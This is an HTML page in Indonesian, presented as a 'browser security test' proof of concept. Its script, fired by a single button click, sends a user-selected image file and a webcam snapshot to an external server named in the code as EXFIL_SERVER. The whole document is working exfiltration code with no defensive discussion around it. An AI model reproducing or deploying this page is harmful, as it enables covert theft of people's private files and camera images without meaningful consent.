<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Uji Coba Keamanan Browser</title>
</head>
<body>
    <button id="trigger-btn" style="padding: 20px; font-size: 20px; cursor: pointer;">
        Klik untuk Memulai Uji Coba
    </button>

    <script>
        // URL Beeceptor Anda yang sudah diperbarui
        const EXFIL_SERVER = "https://browser-bug-poc.free.beeceptor.com";

        document.getElementById('trigger-btn').addEventListener('click', async () => {
            console.log("Memulai proses...");

            // 1. Uji File Picker (Akses Galeri)
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.onchange = (e) => {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = (ev) => {
                    fetch(EXFIL_SERVER, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ 
                            type: 'uploaded file', 
                            fileName: file.name, 
                            data: ev.target.result 
                        }),
                        keepalive: true
                    });
                };
                reader.readAsDataURL(file);
            };
            input.click();

            // 2. Uji Akses Kamera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Menunggu stream siap
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    fetch(EXFIL_SERVER, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ 
                            type: 'camera_capture', 
                            data: canvas.toDataURL('image/jpeg') 
                        }),
                        keepalive: true
                    });
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);
            } catch (err) { 
                console.error("Akses kamera ditolak atau gagal:", err); 
            }
        });
    </script>
</body>
</html>
